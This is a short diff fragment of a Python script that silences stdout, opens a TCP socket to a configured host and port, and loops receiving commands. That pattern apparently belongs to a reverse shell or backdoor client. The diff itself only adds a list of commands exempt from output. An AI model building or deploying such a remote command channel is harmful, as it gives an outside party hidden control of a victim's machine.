@@ -22,6 +22,8 @@ sys.stdout = open(os.devnull, "w")
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 sock.connect((str(HOST), int(PORT)))
 
+no_output = ['cd']
+
 while True:
     cmd = sock.recv(1024).decode()
 
